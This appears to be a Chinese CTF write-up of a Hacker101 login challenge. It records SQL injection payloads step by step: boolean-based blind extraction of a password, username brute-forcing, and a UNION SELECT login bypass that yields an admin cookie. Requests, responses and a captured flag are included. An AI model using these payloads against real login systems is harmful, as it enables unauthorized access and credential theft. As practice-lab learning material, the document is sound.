测试 `/login` 登录功能 SQL 注入
- username 字段的 `'` 单引号
    ```http
    POST /login HTTP/2
    Host: id.ctf.hacker101.com
    Content-Length: 31
    Content-Type: application/x-www-form-urlencoded

    username=wiener'&password=peter
    ```
    - 响应 500 Internal Server Error
        ```
        The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.
        ```
    
    - 测试双重单引号 
        `username=wiener''&password=peter`
        - 响应200
        - 确认 SQL 注入，单/双引号导致异常与普通响应
        - 此时或可进行基于布尔的 SQL 信息提取

- 测试 username 字段的 SQL 注释
    `username=wiener'%20--%20&password=peter`
    - 多次尝试，格式为 `' -- `。最后拥有空格，猜测数据库类型为 MySQL

    - 进行用户名暴破
        `username=§wiener§'%20--%20&password=peter`
        - 得到特异响应的请求
            `username=debera'%20--%20&password=peter`
            - 响应
                `Unknown user`
            - 推测 SQL 查询结构并非 `username=x AND password=x`，否则此处的注释应当成功返回

- 测试 SQL 字符串连接
    `username=deb'%2b'era&password=peter`
    - 响应 hit `Invalid password`
        - 使用 `+` 连接字符串成功

- 基于有效用户名进行 SQL 注入模糊测试
    `username=debera§§&password=peter`
    - 支持多种连接符，支持 `#` 注释，很可能为 MySQL

- 尝试基于布尔的 SQLi
    - 条件查询
        - `debera' AND 1=0 -- `
            - 响应 `Unknown user`
        - `debera' AND 1=1 -- `
            - 响应 `Invalid password`
        - 得到触点

- 测试字段名
    - `debera' AND LENGTH(username)>0 -- `
        - hit `username` 列名存在
    - `debera' AND LENGTH(password)>0 -- `
        - hit `password` 列名存在

- 暴破或手动测试密码字段长度
    `debera' AND LENGTH(password)=6 -- `
    - 长度 `6`

- 暴破密码
    ```sql
    username='debera' AND ASCII(SUBSTRING(password,§1§,1))=§97§ -- 
    ```
    - burp 设置集束炸弹模式
        - 注入点1，设置数字范围1-6
        - 注入点2，设置可见字符的数字范围 32-126

    - 组合6个 hit，得到 `raeann`

- 使用凭据登录
    ```http
    POST /login HTTP/2
    Host: id.ctf.hacker101.com

    username=debera&password=raeann
    ```
    - 响应
        ```
        ^FLAG^cdaa1c8919932eaf81c3a97d98974c61e9c8a707898e34ac800b286aff29a307$FLAG$
        ```
    > [!NOTE] 是否存在更简单的 SQL 注入方式？
    - 之后测试发现：移除或任意设置 `username` 字段，仅 `password=raeann` 即可获得 flag
    

使用 hint
```md
Flag0 -- Not Found

- Regular users can only see public pages
- Getting admin access might require a more perfect union
- Knowing the password is cool, but there are other approaches that might be easier
```
- 似乎为表单的 SQL UNION 技术，或者仍为文章索引 `3`

Host 头注入、IP 覆盖均无效

主题文档仅包含 UNION 提取数据的技巧，信息缺失，搜索文章/载荷
- [PayloadsAllTheThings SQL](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md#hashed-passwords)
    - 此处示例的后端代码并非常规的 SQL 查询 `username=提交用户名 AND password=提交密码`。而是使用`提交用户名` SQL 查询密码后，从结果中判断是否与提交密码对应
    - 若存在 SQLi，使用 UNION 注入攻击者控制的密码

- 使用载荷文档示例的新技术
    ```http
    POST /login HTTP/2
    Host: id.ctf.hacker101.com
    Content-Length: 87
    Content-Type: application/x-www-form-urlencoded

    username=<@urlencode>NotExist' UNION SELECT 'sqlipwd' -- </@urlencode>&password=sqlipwd
    ```
    - 之前已使用 `UNION SELECT NULL` 探测到结果为1行
    - 载荷使用不存在的用户名以及 UNION 注入之后将作为密码的字符串
    - 密码字段设置相同密码

    - 响应
        ```http
        HTTP/2 200 OK
        Set-Cookie: l2session=eyJhZG1pbiI6dHJ1ZX0.ap5fqg.Z2pSOYx3DdYMekiuIHYbxbTxPWw; HttpOnly; Path=/


        <!doctype html>
        <html>
            <head>
                <title>Logged in</title>
            </head>
            <body>
                <h1>Logged In!</h1>
                <a href="home">Go Home</a>
                <script>setTimeout(function() { window.location = 'home'; }, 3000);</script>
                <!-- You got logged in, congrats!  Do you have the real username and password?  If not, might want to do that! -->
            </body>
        </html>
        ```
        - 设置 JWT 格式会话 cookie，第一段解码后 `{"admin":true}`
    
- 使用管理员会话 cookie 访问首页即显示之前无法访问的文章索引 3 的链接
    ```html

        Private Page
    ```
